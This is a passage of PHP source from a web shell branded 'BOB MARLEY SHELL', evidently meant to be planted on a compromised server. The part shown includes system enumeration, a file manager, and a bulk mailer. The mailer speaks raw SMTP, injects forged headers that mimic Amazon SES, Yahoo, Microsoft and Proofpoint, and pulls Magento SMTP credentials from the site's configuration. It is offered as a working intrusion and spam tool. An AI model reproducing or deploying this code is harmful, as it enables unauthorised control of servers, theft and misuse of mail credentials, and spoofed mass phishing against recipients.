            'from_email' => trim($_POST['smtp_from_email'])
        ];
        file_put_contents($smtp_config_file, json_encode($configs));
        $msg = "SMTP Config '$config_name' Saved";
    } else {
        $msg = "Please enter a config name";
    }
}

// SMTP Send Function with proper TLS/SSL support
function sendViaSMTP($to, $subject, $message, $headers, $smtp_config, &$error_msg = '') {
    $smtp_host = $smtp_config['host'];
    $smtp_port = $smtp_config['port'];
    $smtp_user = $smtp_config['user'];
    $smtp_pass = $smtp_config['pass'];
    $encryption = $smtp_config['encryption'];
    $from = $smtp_config['from'];
    
    // Auto-detect encryption based on port
    if ($encryption == 'auto') {
        if ($smtp_port == 465) {
            $encryption = 'ssl';
        } elseif ($smtp_port == 587) {
            $encryption = 'tls';
        } else {
            $encryption = 'none';
        }
    }
    
    // For SSL (port 465), use ssl:// prefix
    if ($encryption == 'ssl') {
        $smtp_host = 'ssl://' . $smtp_host;
    }
    
    // Connect to SMTP server
    $socket = @fsockopen($smtp_host, $smtp_port, $errno, $errstr, 30);
    if (!$socket) {
        $error_msg = "Connection failed: $errstr ($errno)";
        return false;
    }
    
    // Read server greeting
    $response = fgets($socket, 515);
    if (substr($response, 0, 3) != '220') {
        $error_msg = "Server greeting failed: $response";
        fclose($socket);
        return false;
    }
    
    // Send EHLO
    $ehlo = getSmtpEhloHost();
    fputs($socket, "EHLO $ehlo\r\n");
    $response = '';
    while ($line = fgets($socket, 515)) {
        $response .= $line;
        if (substr($line, 3, 1) == ' ') break;
    }
    
    // For TLS (port 587), send STARTTLS
    if ($encryption == 'tls') {
        fputs($socket, "STARTTLS\r\n");
        $response = fgets($socket, 515);
        if (substr($response, 0, 3) != '220') {
            $error_msg = "STARTTLS failed: $response";
            fclose($socket);
            return false;
        }
        
        // Enable crypto
        if (!stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT)) {
            $error_msg = "TLS encryption failed";
            fclose($socket);
            return false;
        }
        
        // Send EHLO again after STARTTLS
        fputs($socket, "EHLO $ehlo\r\n");
        while ($line = fgets($socket, 515)) {
            if (substr($line, 3, 1) == ' ') break;
        }
    }
    
    // Authenticate
    if ($smtp_user && $smtp_pass) {
        fputs($socket, "AUTH LOGIN\r\n");
        $response = fgets($socket, 515);
        if (substr($response, 0, 3) != '334') {
            $error_msg = "AUTH LOGIN failed: $response";
            fclose($socket);
            return false;
        }
        
        fputs($socket, base64_encode($smtp_user) . "\r\n");
        $response = fgets($socket, 515);
        if (substr($response, 0, 3) != '334') {
            $error_msg = "Username rejected: $response";
            fclose($socket);
            return false;
        }
        
        fputs($socket, base64_encode($smtp_pass) . "\r\n");
        $response = fgets($socket, 515);
        if (substr($response, 0, 3) != '235') {
            $error_msg = "Authentication failed: $response";
            fclose($socket);
            return false;
        }
    }
    
    // Send MAIL FROM
    fputs($socket, "MAIL FROM: <$from>\r\n");
    $response = fgets($socket, 515);
    if (substr($response, 0, 3) != '250') {
        $error_msg = "MAIL FROM rejected: $response";
        fclose($socket);
        return false;
    }
    
    // Send RCPT TO
    fputs($socket, "RCPT TO: <$to>\r\n");
    $response = fgets($socket, 515);
    if (substr($response, 0, 3) != '250') {
        $error_msg = "RCPT TO rejected: $response";
        fclose($socket);
        return false;
    }
    
    // Send DATA
    fputs($socket, "DATA\r\n");
    $response = fgets($socket, 515);
    if (substr($response, 0, 3) != '354') {
        $error_msg = "DATA command rejected: $response";
        fclose($socket);
        return false;
    }
    
    // Send email content
    // Send headers (which already includes From, Reply-To, etc.)
    fputs($socket, $headers);
    // Send subject as part of headers
    fputs($socket, "Subject: $subject\r\n");
    // Empty line to separate headers from body
    fputs($socket, "\r\n");
    // Send message body
    fputs($socket, $message . "\r\n");
    // End with dot
    fputs($socket, ".\r\n");
    $response = fgets($socket, 515);
    if (substr($response, 0, 3) != '250') {
        $error_msg = "Message rejected: $response";
        fclose($socket);
        return false;
    }
    
    // Send QUIT
    fputs($socket, "QUIT\r\n");
    fclose($socket);
    
    return true;
}


// Function to build email headers (called for each email to randomize)
function buildEmailHeaders($sender_name, $sender_email, $reply_to, $spoof_type, $mail_type, $for_smtp = false, $include_x_mailer = true) {
    global $spoof_headers;
    $from_domain = substr(strrchr($sender_email, "@"), 1);
    
    // For SMTP, headers don't need ending \r\n, they're added when sending
    // For mail(), headers need to be one continuous string
    $nl = "\r\n";
    
    $headers = "From: $sender_name <$sender_email>" . $nl;
    $headers .= "Reply-To: $reply_to" . $nl;
    $headers .= "Message-ID: <" . bin2hex(random_bytes(8)) . "." . time() . "@" . preg_replace('/[^a-zA-Z0-9.\-]/', '', $from_domain ?: 'localhost') . ">" . $nl;
    $headers .= "Date: " . date('r') . $nl;
    
    // Add spoofing headers (randomized each call)
    if (isset($spoof_headers[$spoof_type])) {
        foreach ($spoof_headers[$spoof_type] as $header_name => $header_value) {
            $processed_header = processSpoofHeader($header_value, $sender_email, $from_domain);
            $headers .= "$header_name: $processed_header" . $nl;
        }
    }
    
    // Optional X-Mailer when not using spoof presets
    if ($include_x_mailer && $spoof_type == 'none') {
        $headers .= "X-Mailer: PHP/" . phpversion() . $nl;
    }
    
    $headers .= "X-Priority: 3" . $nl;
    $headers .= "MIME-Version: 1.0" . $nl;
    
    // Content-Type is set by prepareEmailPayload() for multipart / plain
    
    // For mail() function, don't include trailing newline
    if (!$for_smtp) {
        $headers = rtrim($headers);
    }
    
    return $headers;
}

// 7. Handling Mailer
$sending_mail = isset($_POST['send_mail']);
if ($sending_mail) {
    $sender_email = trim($_POST['sender_email']) ?: 'noreply@localhost.com';
    $sender_name = trim($_POST['sender_name']) ?: 'Sender';
    $reply_to = trim($_POST['reply_to']) ?: $sender_email;
    $subject = trim($_POST['subject']) ?: 'No Subject';
    $message = $_POST['message'];
    $mail_type = $_POST['mail_type'];
    $send_method = $_POST['send_method'];
    $spoof_type = $_POST['spoof_type'] ?? 'none';
    $include_x_mailer = !isset($_POST['include_x_mailer']) || $_POST['include_x_mailer'] === '1';
    
    // Prepare message content
    if ($mail_type == 'html' && stripos($message, '<html') === false) {
        $message = "<!DOCTYPE html><html><head><meta charset='UTF-8'></head><body>$message</body></html>";
    }
    
    // Get recipients from file or textarea
    $recipients = [];
    if (isset($_FILES['recipient_file']) && $_FILES['recipient_file']['error'] == 0) {
        $file_path = $_FILES['recipient_file']['tmp_name'];
        $handle = fopen($file_path, 'r');
        while (($line = fgets($handle)) !== false) {
            $email = trim($line);
            if (!empty($email) && strpos($email, '@') !== false && substr($email, 0, 1) !== '#') {
                $recipients[] = $email;
            }
        }
        fclose($handle);
    } elseif (isset($_POST['recipient_list']) && !empty($_POST['recipient_list'])) {
        $recipients = array_filter(array_map('trim', explode("\n", $_POST['recipient_list'])));
    } elseif (isset($_POST['single_recipient']) && !empty($_POST['single_recipient'])) {
        $recipients[] = trim($_POST['single_recipient']);
    }
    
    
    // HANDLE AJAX REQUEST IMMEDIATELY - Before ANY HTML output
    if (isset($_POST['ajax_send'])) {
        header('Content-Type: application/json');
        
        $result = [
            'status' => 'processing',
            'current' => 0,
            'total' => count($recipients),
            'sent' => 0,
            'failed' => 0,
            'log' => []
        ];
        
        if (!empty($recipients)) {
            $sent = 0;
            $failed = 0;
            
            list($smtp_ok, $smtp_config, $smtp_err) = resolveMailSmtpConfig($send_method, $_POST, $sender_email, $dir);
            if (!$smtp_ok) {
                echo json_encode(['status' => 'error', 'message' => $smtp_err, 'sent' => 0, 'failed' => count($recipients), 'log' => []]);
                exit;
            }
            if ($send_method === 'magento' && !empty($smtp_config['from']) && (empty(trim($_POST['sender_email'])) || strpos($_POST['sender_email'], '@localhost') !== false)) {
                $sender_email = $smtp_config['from'];
            }
            if ($send_method === 'magento' && !empty($smtp_config['from_name']) && (empty(trim($_POST['sender_name'])) || $_POST['sender_name'] === 'System')) {
                $sender_name = $smtp_config['from_name'];
            }
            
            foreach ($recipients as $idx => $email) {
                $email = trim($email);
                
                if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
                    $success = false;
                    $error_msg = '';
                    $success = dispatchMailSend($send_method, $email, $subject, $message, $sender_name, $sender_email, $reply_to, $spoof_type, $mail_type, $smtp_config, $include_x_mailer, $error_msg);
                    
                    if ($success) {
                        $sent++;
                        $result['log'][] = ['email' => $email, 'status' => 'sent'];
                    } else {
                        $failed++;
                        $result['log'][] = ['email' => $email, 'status' => 'failed', 'error' => $error_msg];
                    }
                } else {
                    $failed++;
                    $result['log'][] = ['email' => $email, 'status' => 'invalid'];
                }
                
                usleep(100000);
            }
            
            $result['sent'] = $sent;
            $result['failed'] = $failed;
            $result['status'] = 'completed';
            
            // Save history
            $history_file = $dir . '/.mailer_history.log';
            $history_entry = date('[Y-m-d H:i:s]') . " | Sent: $sent | Failed: $failed | Method: " . strtoupper($send_method) . "\n";
            file_put_contents($history_file, $history_entry, FILE_APPEND);
        }
        
        echo json_encode($result);
        exit; // CRITICAL: Exit before any HTML
    }
}

// --- SYSTEM ENUMERATION ---
$os = php_uname();
$software = $_SERVER['SERVER_SOFTWARE'];
$user = get_current_user() . " (".getmyuid().")";
$ip = $_SERVER['SERVER_ADDR'] ?: "127.0.0.1";
$df = round(disk_free_space("/") / (1024*1024*1024), 2);
?>
<!DOCTYPE html>
<html>
<head>
    <title>BOB MARLEY SHELL</title>
    <style>
        body { background: #000; color: #0f0; font-family: "Courier New", monospace; font-size: 13px; margin: 0; padding: 15px; }
        a { color: #0f0; text-decoration: none; } a:hover { color: #fff; }
        .head { text-align: center; border-bottom: 2px solid #0f0; margin-bottom: 10px; padding: 10px; }
        .head h1 { color: #00ffff; margin: 0; font-size: 24px; }
        .info { display: flex; justify-content: space-between; border-bottom: 1px solid #0f0; padding: 5px 0; }
        .path { margin: 10px 0; display: flex; justify-content: space-between; }
        table { width: 100%; border-collapse: collapse; border: 1px solid #0f0; }
        th { background: #003300; padding: 8px; border: 1px solid #0f0; text-align: left; }
        td { padding: 5px; border: 1px solid #0f0; }
        tr:hover { background: #001100; }
        .panel { border: 1px solid #0f0; margin-top: 20px; padding: 15px; }
        .panel h2 { text-align: center; font-size: 16px; margin: 0 0 15px 0; color: #00ffff; border-bottom: 1px solid #0f0; }
        input[type="text"], select, textarea { background: #000; border: 1px solid #0f0; color: #0f0; padding: 3px; }
        input[type="submit"], button { background: #000; border: 1px solid #0f0; color: #0f0; cursor: pointer; padding: 3px 15px; }
        .output { background: #000; color: #0f0; border: 1px solid #00ffff; padding: 10px; margin-top: 15px; white-space: pre-wrap; word-break: break-all; }
        .status { color: #ffff00; text-align: center; margin: 10px 0; font-weight: bold; }
        .dir { color: #ffff00; font-weight: bold; } .file { color: #00ffff; }
        .zip { color: #ff00ff; font-weight: bold; }
    </style>
    <script>
    function insertHTMLTemplate() {
        var template = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f4f4f4; }
        .container { max-width: 600px; margin: 20px auto; background: #ffffff; padding: 20px; border-radius: 5px; }
        .header { background: #4CAF50; color: white; padding: 20px; text-align: center; border-radius: 5px 5px 0 0; }
        .content { padding: 20px; color: #333; }
        .button { background: #4CAF50; color: white; padding: 12px 30px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 10px 0; }
        .footer { text-align: center; padding: 15px; color: #888; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Your Title Here</h1>
        </div>
        <div class="content">
            <h2>Hello!</h2>
            <p>Your message content goes here. Edit this template as needed.</p>
            <a href="https://example.com" class="button">Click Here</a>
        </div>
        <div class="footer">
            <p>&copy; 2024 Your Company. All rights reserved.</p>
        </div>
    </div>
</body>
</html>`;
        document.querySelector('textarea[name="message"]').value = template;
        document.getElementById('mail_type').value = 'html';
    }
    
    function updatePlaceholder() {
        var type = document.getElementById('mail_type').value;
        var textarea = document.querySelector('textarea[name="message"]');
        if (type === 'html') {
            textarea.placeholder = 'Paste your HTML code here or click "Insert HTML Template"...';
        } else {
            textarea.placeholder = 'Your plain text message here...';
        }
    }
    
    function toggleSMTP() {
        var method = document.getElementById('send_method').value;
        var smtpConfig = document.getElementById('smtp_config');
        var magentoInfo = document.getElementById('magento_info');
        if (method === 'smtp' || method === 'phpmailer') {
            smtpConfig.style.display = '';
        } else {
            smtpConfig.style.display = 'none';
        }
        if (magentoInfo) {
            magentoInfo.style.display = (method === 'magento') ? 'block' : 'none';
        }
    }
    
    
    function loadConfig() {
        var select = document.getElementById('saved_configs');
        if (select.value) {
            var config = JSON.parse(select.value);
            document.getElementById('smtp_host').value = config.host;
            document.getElementById('smtp_port').value = config.port;
            document.getElementById('smtp_user').value = config.user;
            document.getElementById('smtp_pass').value = config.pass;
            document.getElementById('smtp_encryption').value = config.encryption;
            if (config.from_email) {
                document.getElementById('smtp_from_email').value = config.from_email;
                document.getElementsByName('sender_email')[0].value = config.from_email;
            }
            document.getElementById('send_method').value = 'smtp';
            toggleSMTP();
        }
    }
    
    function showSpoofInfo() {
        var spoofType = document.getElementById('spoof_type').value;
        var infoDiv = document.getElementById('spoof_info');
        var detailsDiv = document.getElementById('spoof_details');
        
        var spoofDetails = {
            'none': 'No spoofing headers added. Standard PHP mailer headers.',
            'aws_ses': 'Amazon SES/WorkMail headers: X-Mailer, Feedback-ID, X-SES-Message-ID, X-SES-Signature, X-SES-Mail-From, X-SES-Outgoing',
            'yahoo': 'Yahoo Mail headers: X-Mailer, X-YMail-OSG, X-Yahoo-Newman-Property, X-YMail-SEC, X-Yahoo-SMTP, X-Yahoo-From',
            'microsoft': 'Microsoft Outlook/Exchange headers: X-Mailer, X-MimeOLE, X-MS-Exchange-Organization headers',
            'custom': 'Custom anti-spam headers: X-Originating-IP, X-Proofpoint-Spam-Details, X-Custom-Header'
        };
        
        var showInfo = spoofType !== 'none';
        
        if (showInfo) {
            infoDiv.style.display = 'block';
            var html = '<strong style="color:#00ffff;">Headers:</strong> ' + spoofDetails[spoofType] + '<br><span style="color:#ff00ff;">All values randomized with each send for uniqueness.</span>';
            detailsDiv.innerHTML = html;
        } else {
            infoDiv.style.display = 'none';
        }
    }
    
    // Add event listener
    document.addEventListener('DOMContentLoaded', function() {
        var spoofSelect = document.getElementById('spoof_type');
        if (spoofSelect) {
            spoofSelect.addEventListener('change', showSpoofInfo);
        }
        toggleSMTP();
    });
    
    // AJAX Email Sending with Real-Time Progress
    async function sendEmails(event) {
        event.preventDefault();
        
        var form = document.getElementById('mailer_form');
        var formData = new FormData(form);
        
        // Show live panels
        document.getElementById('live_status_panel').style.display = 'block';
        document.getElementById('live_email_list').style.display = 'block';
        document.getElementById('send_status').innerHTML = 'Initializing...';
        document.getElementById('send_status').style.color = '#ffff00';
        
        // Disable send button
        var sendBtn = form.querySelector('input[name="send_mail"]');
        if (sendBtn) {
            sendBtn.disabled = true;
            sendBtn.value = 'Sending...';
        }
        
        var emailItems = document.getElementById('email_items');
        emailItems.innerHTML = '';
        
        try {
            // Send the full request to get all results at once
            formData.append('ajax_send', '1');
            formData.append('send_mail', '1');
            
            document.getElementById('send_status').innerHTML = 'Sending emails...';
            
            const response = await fetch('', {
                method: 'POST',
                body: formData
            });
            
            const data = await response.json();
            
            // Display results in real-time
            var sentCount = 0;
            var failedCount = 0;
            
            for (let i = 0; i < data.log.length; i++) {
                var item = data.log[i];
                
                // Update counts
                if (item.status === 'sent') {
                    sentCount++;
                } else {
                    failedCount++;
                }
                
                // Update status
                document.getElementById('sent_count').innerHTML = sentCount;
                document.getElementById('failed_count').innerHTML = failedCount;
                document.getElementById('total_count').innerHTML = data.log.length;
                
                // Update progress bar
                var progress = Math.round(((i + 1) / data.log.length) * 100);
                document.getElementById('progress_bar').style.width = progress + '%';
                document.getElementById('progress_text').innerHTML = progress + '%';
                
                // Add email to list
                var div = document.createElement('div');
                div.style.padding = '5px';
                div.style.marginBottom = '3px';
                div.style.borderLeft = '3px solid ' + (item.status === 'sent' ? '#0f0' : (item.status === 'failed' ? '#f00' : '#ff0'));
                div.style.background = '#001100';
                
                var statusColor = item.status === 'sent' ? '#0f0' : (item.status === 'failed' ? '#f00' : '#ff0');
                var statusText = item.status === 'sent' ? 'SENT' : (item.status === 'failed' ? 'FAILED' : 'INVALID');
                var statusIcon = item.status === 'sent' ? '✓' : (item.status === 'failed' ? '✗' : '!');
                
                var html = '<span style="color:#00aaff;">#' + (i + 1) + '</span> ';
                html += '<span style="color:#fff;">' + item.email + '</span><br>';
                if (item.from) {
                    html += '<span style="color:#ff00ff; font-size: 9px;">From: ' + item.from + '</span> ';
                }
                html += '<span style="color:' + statusColor + '; font-weight: bold;">' + statusIcon + ' ' + statusText + '</span>';
                
                if (item.error) {
                    html += '<br><span style="color:#f00; font-size: 9px;">Error: ' + item.error + '</span>';
                }
                
                div.innerHTML = html;
                emailItems.insertBefore(div, emailItems.firstChild);
                
                // Auto-scroll to top
                emailItems.scrollTop = 0;
                
                // Small delay for visual effect
                await new Promise(resolve => setTimeout(resolve, 50));
            }
            
            // Final status
            document.getElementById('send_status').innerHTML = 'Completed!';
            document.getElementById('send_status').style.color = '#0f0';
            
            // Re-enable send button
            if (sendBtn) {
                sendBtn.disabled = false;
                sendBtn.value = 'Send Now';
            }
            
            // Reload history after 3 seconds
            setTimeout(function() {
                location.reload();
            }, 3000);
            
        } catch (error) {
            document.getElementById('send_status').innerHTML = 'Error: ' + error.message;
            document.getElementById('send_status').style.color = '#f00';
            if (sendBtn) {
                sendBtn.disabled = false;
                sendBtn.value = 'Send Now';
            }
        }
        
        return false;
    }
    </script>
</head>
<body>

    <div class="head">
        <h1>&diams; Powered by BOB MARLEY &diams;</h1>
        <div style="color: #ffff00; font-weight: bold;">:: One Love, One Heart, One Goal ::</div>
        <div style="margin-top: 10px;">
            <a href="?dir=<?php echo urlencode($dir); ?>" style="padding: 5px 15px; border: 1px solid #0f0; margin: 0 5px;">File Manager</a>
            <a href="?mode=mailer&dir=<?php echo urlencode($dir); ?>" style="padding: 5px 15px; border: 1px solid #0f0; margin: 0 5px;">Mailer</a>
            <a href="?logout=1" style="padding: 5px 15px; border: 1px solid #ff0000; margin: 0 5px; color: #ff0000;" onclick="return confirm('Logout from shell?')">Logout</a>
        </div>
    </div>

    <div class="info">
        <div>Software: <?php echo $software; ?><br>OS: <?php echo $os; ?><br>User: <?php echo $user; ?></div>
        <div style="text-align: right;">Server IP: <?php echo $ip; ?><br>Free Space: <?php echo $df; ?> GB</div>
    </div>

    <div class="path">
        <div>CWD: <span style="color: #fff;"><?php echo $dir; ?></span> [<?php echo get_perms($dir); ?>]</div>
        <form method="POST">
            Dir: <input type="text" name="new_dir" value="<?php echo $dir; ?>" style="width: 200px;">
            <input type="submit" name="go_dir" value="Go">
        </form>
    </div>

    <?php if ($msg): ?><div class="status">[ <?php echo $msg; ?> ]</div><?php endif; ?>

    <!-- MAILER MODE -->
    <?php if ($mailer_mode): ?>
    
    <?php if ($sending_mail && !isset($_POST['ajax_send'])): ?>
    <!-- OLD STYLE RESULTS (Non-AJAX fallback) -->
    <div class="panel">
        <h2>Sending Emails - Live Progress</h2>
        <div style="background: #001100; border: 1px solid #00ffff; padding: 10px; margin-bottom: 10px;">
            <strong style="color: #00ffff;">Live Status:</strong>
            <span id="live_status" style="color: #0f0;">Initializing...</span>
        </div>
        <div id="progress_panel" style="background: #000; border: 1px solid #0f0; padding: 15px; font-family: monospace; max-height: 600px; overflow-y: auto;">
            <div style="margin-bottom: 15px;">
                <strong style="color: #00ffff;">Starting bulk send...</strong><br>
                Total Recipients: <?php echo count($recipients); ?><br>
                Method: <?php echo strtoupper($send_method); ?><br>
                Spoof Type: <?php echo strtoupper($spoof_type); ?><br>
                <?php if ($spoof_type != 'none'): ?>
                <span style="color: #ff00ff;">Spoofing ACTIVE - Headers randomized per email</span><br>
                <?php endif; ?>
                ---
            </div>
            <script>
            // Auto-scroll to bottom and update status
            function scrollToBottom() {
                var panel = document.getElementById('progress_panel');
                if (panel) {
                    panel.scrollTop = panel.scrollHeight;
                }
                window.scrollTo(0, document.body.scrollHeight);
            }
            function updateStatus(sent, failed, total) {
                var status = document.getElementById('live_status');
                if (status) {
                    status.innerHTML = 'Sent: <span style="color:#0f0;">' + sent + '</span> | Failed: <span style="color:#f00;">' + failed + '</span> | Progress: ' + (sent + failed) + '/' + total;
                }
            }
            setInterval(scrollToBottom, 100);
            </script>
            <?php
            // Force output
            flush();
            if (!empty($recipients)) {
                $sent = 0;
                $failed = 0;
                $sent_list = [];
                $failed_list = [];
                
                list($smtp_ok, $smtp_config, $smtp_err) = resolveMailSmtpConfig($send_method, $_POST, $sender_email, $dir);
                if (!$smtp_ok) {
                    echo "<div style='color:#ff0000;'>Magento/SMTP config error: " . htmlspecialchars($smtp_err) . "</div>";
                    $smtp_config = [];
                }
                if ($send_method === 'magento' && !empty($smtp_config['from'])) {
                    if (empty(trim($_POST['sender_email'])) || strpos($_POST['sender_email'], '@localhost') !== false) {
                        $sender_email = $smtp_config['from'];
                    }
                    if (!empty($smtp_config['from_name']) && (empty(trim($_POST['sender_name'])) || $_POST['sender_name'] === 'System')) {
                        $sender_name = $smtp_config['from_name'];
                    }
                }
                
                $total = count($recipients);
                $from_emails_count = isset($from_emails) ? count($from_emails) : 0;
                echo "<script>updateStatus(0, 0, $total);</script>";
                flush();
                foreach ($recipients as $idx => $email) {
                    $email = trim($email);
                    $num = $idx + 1;
                    
                    if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
                        echo "<div style='color:#ffff00;'>[$num/$total] Sending to: $email...</div>";
                        ob_flush();
                        flush();
                        
                        $success = false;
                        $error_msg = '';
                        if (!$smtp_ok && in_array($send_method, ['smtp', 'phpmailer', 'magento'], true)) {
                            $error_msg = $smtp_err;
                        } else {
                            $success = dispatchMailSend($send_method, $email, $subject, $message, $sender_name, $sender_email, $reply_to, $spoof_type, $mail_type, $smtp_config, $include_x_mailer, $error_msg);
                        }
                        
                        if ($success) {
                            $sent++;
                            $sent_list[] = $email;
                            echo "<div style='color:#00ff00;'>SUCCESS</div>";
                        } else {
                            $failed++;
                            $failed_list[] = $email . ($error_msg ? " ($error_msg)" : '');
                            echo "<div style='color:#ff0000;'>FAILED" . ($error_msg ? ": $error_msg" : '') . "</div>";
                        }
                        echo "<script>updateStatus($sent, $failed, $total);</script>";
                        ob_flush();
                        flush();
                        usleep(100000);
                    } else {
                        $failed++;
                        $failed_list[] = $email . " (invalid)";
                        echo "<div style='color:#ff0000;'>[$num/$total] Invalid email: $email</div>";
                        ob_flush();
                        flush();
                    }
                }
                
                // Save history
                $history_file = $dir . '/.mailer_history.log';
                $history_entry = date('[Y-m-d H:i:s]') . " | Sent: $sent | Failed: $failed | Method: " . strtoupper($send_method) . "\n";
                file_put_contents($history_file, $history_entry, FILE_APPEND);
                
                echo "<div style='margin-top: 20px; padding: 15px; border: 1px solid #00ffff;'>";
                echo "<strong style='color:#00ffff;'>COMPLETED</strong><br>";
                echo "<span style='color:#00ff00;'>Sent: $sent</span><br>";
                echo "<span style='color:#ff0000;'>Failed: $failed</span><br>";
                echo "Total: $total<br>";
                echo "</div>";
                flush();
                
                if (!empty($sent_list)) {
                    echo "<div style='margin-top: 10px; max-height: 150px; overflow-y: auto; border: 1px solid #0f0; padding: 10px;'>";
                    echo "<strong style='color:#0f0;'>Sent Emails:</strong><br>";
                    foreach ($sent_list as $e) echo "<span style='font-size:11px;'>$e</span><br>";
                    echo "</div>";
                    flush();
                }
                
                if (!empty($failed_list)) {
                    echo "<div style='margin-top: 10px; max-height: 150px; overflow-y: auto; border: 1px solid #f00; padding: 10px;'>";
                    echo "<strong style='color:#f00;'>Failed Emails:</strong><br>";
                    foreach ($failed_list as $e) echo "<span style='font-size:11px;'>$e</span><br>";
                    echo "</div>";
                    flush();
                }
            } else {
                echo "<div style='color:#ff0000;'>No recipients found!</div>";
            }
            ?>
        </div>
        <div style="margin-top: 15px; text-align: center;">
            <a href="?mode=mailer&dir=<?php echo urlencode($dir); ?>" style="padding: 10px 20px; border: 1px solid #0f0; display: inline-block;">Back to Mailer</a>
        </div>
    </div>
    <?php else: ?>
    <!-- MAILER FORM -->
    <?php $magento_smtp_detect = getMagentoSmtpConfig($dir); ?>
    <div style="display: flex; gap: 15px;">
        <!-- LEFT PANEL: Form -->
        <div class="panel" style="flex: 2;">
            <h2>BOB MARLEY MAILER</h2>
        
        <form method="POST" enctype="multipart/form-data" id="mailer_form" onsubmit="return sendEmails(event);">
            <table style="width: 100%; border: none;">
                <tr>
                    <td colspan="2" style="border: none; padding: 10px 0;">
                        <strong style="color: #00ffff;">Send Method</strong>
                        <div style="background: #220000; border: 1px solid #ff6600; padding: 5px; margin-top: 5px; font-size: 10px; color: #ff6600;">
                            ⚠ <strong>Important:</strong> Localhost mail() rarely works on shared hosting. Use SMTP for 99% reliability.
                        </div>
                    </td>
                </tr>
                <tr>
                    <td style="border: none; width: 150px;">Method:</td>
                    <td style="border: none;">
                        <select name="send_method" id="send_method" style="padding: 5px;" onchange="toggleSMTP()">
                            <option value="localhost">Localhost mail() - Try 3 methods</option>
                            <option value="magento">Magento (env.php + DB SMTP)</option>
                            <option value="smtp">External SMTP (Recommended)</option>
                            <option value="phpmailer">PHPMailer SMTP (Best)</option>
                        </select>
                        <?php
                        $phpmailer_available = file_exists(__DIR__ . '/src/PHPMailer.php');
                        if ($phpmailer_available):
                        ?>
                        <span style="color: #00ff00; font-size: 11px; margin-left: 10px;">✓ PHPMailer available</span>
                        <?php else: ?>
                        <span style="color: #ff6600; font-size: 11px; margin-left: 10px;">⚠ Localhost often fails - use SMTP!</span>
                        <?php endif; ?>
                    </td>
                </tr>
                <tr>
                    <td colspan="2" style="border: none; padding: 0;">
                        <div id="magento_info" style="display:none; background:#001100; border:1px solid #00ffff; padding:10px; margin:8px 0; font-size:11px;">
                            <strong style="color:#00ffff;">Magento SMTP</strong><br>
                            <?php if ($magento_smtp_detect['ok']): ?>
                            <span style="color:#0f0;">✓ Found via <?php echo htmlspecialchars($magento_smtp_detect['source']); ?></span><br>
                            Host: <b><?php echo htmlspecialchars($magento_smtp_detect['config']['host']); ?></b>
                            | Port: <b><?php echo (int)$magento_smtp_detect['config']['port']; ?></b>
                            | User: <b><?php echo htmlspecialchars($magento_smtp_detect['config']['user']); ?></b><br>
                            From: <b><?php echo htmlspecialchars($magento_smtp_detect['config']['from'] ?: '(use sender field)'); ?></b>
                            | Enc: <b><?php echo htmlspecialchars($magento_smtp_detect['config']['encryption']); ?></b><br>
                            <span style="color:#888;">env: <?php echo htmlspecialchars($magento_smtp_detect['env_path']); ?></span>
                            <?php else: ?>
                            <span style="color:#f66;">✗ <?php echo htmlspecialchars($magento_smtp_detect['error']); ?></span>
                            <?php endif; ?>
                        </div>
                    </td>
                </tr>
                
                <tbody id="smtp_config" style="display: none;">
                    <tr>
                        <td colspan="2" style="border: none; padding: 5px 0;">
                            <div style="background: #001100; padding: 12px; border: 1px solid #00ffff; margin-bottom: 15px;">
                                <table style="width: 100%; border: none;">
                                    <tr>
                                        <td style="border: none; width: 25%; padding: 5px;">
                                            <strong style="color: #00ffff;">Load Config:</strong>
                                        </td>
                                        <td style="border: none; padding: 5px;">
                                            <?php
                                            $configs = file_exists($smtp_config_file) ? json_decode(file_get_contents($smtp_config_file), true) : [];
                                            if (!empty($configs)):
                                            ?>
                                            <select id="saved_configs" onchange="loadConfig()" style="padding: 6px; width: 100%; max-width: 300px; background: #000; color: #0f0; border: 1px solid #0f0;">
                                                <option value="">-- Select Saved Config --</option>
                                                <?php foreach ($configs as $name => $cfg): ?>
                                                <option value='<?php echo htmlspecialchars(json_encode($cfg)); ?>'><?php echo htmlspecialchars($name); ?></option>
                                                <?php endforeach; ?>
                                            </select>
                                            <?php else: ?>
                                            <span style="color: #888; font-size: 11px;">No saved configs available</span>
                                            <?php endif; ?>
                                        </td>
                                    </tr>
                                </table>
                            </div>
                        </td>
                    </tr>
                    
                    <tr>
                        <td colspan="2" style="border: none; padding: 0;">
                            <table style="width: 100%; border: none;">
                                <tr>
                                    <td style="border: none; width: 50%; padding: 5px; vertical-align: top;">
                        <label style="color: #0f0; display: block; margin-bottom: 3px;">SMTP Server</label>
                        <input type="text" name="smtp_host" id="smtp_host" placeholder="smtp.example.com" style="width: 95%; padding: 6px; background: #000; color: #0f0; border: 1px solid #0f0;">
                                    </td>
                                    <td style="border: none; width: 25%; padding: 5px; vertical-align: top;">
                                        <label style="color: #0f0; display: block; margin-bottom: 3px;">Port</label>
                                        <input type="number" name="smtp_port" id="smtp_port" value="587" style="width: 90%; padding: 6px; background: #000; color: #0f0; border: 1px solid #0f0;">
                                    </td>
                                    <td style="border: none; width: 25%; padding: 5px; vertical-align: top;">
                                        <label style="color: #0f0; display: block; margin-bottom: 3px;">Security</label>
                                        <select name="smtp_encryption" id="smtp_encryption" style="width: 90%; padding: 6px; background: #000; color: #0f0; border: 1px solid #0f0;">
                                            <option value="auto">Auto</option>
                                            <option value="tls" selected>TLS</option>
                                            <option value="ssl">SSL</option>
                                            <option value="none">None</option>
                                        </select>
                                    </td>
                                </tr>
                            </table>
                        </td>
                    </tr>
                    
                    <tr>
                        <td colspan="2" style="border: none; padding: 0;">
                            <table style="width: 100%; border: none;">
                                <tr>
                                    <td style="border: none; width: 50%; padding: 5px; vertical-align: top;">
                        <label style="color: #0f0; display: block; margin-bottom: 3px;">Username</label>
                        <input type="text" name="smtp_user" id="smtp_user" placeholder="username" style="width: 95%; padding: 6px; background: #000; color: #0f0; border: 1px solid #0f0;">
                                    </td>
                                    <td style="border: none; width: 50%; padding: 5px; vertical-align: top;">
                                        <label style="color: #0f0; display: block; margin-bottom: 3px;">Password</label>
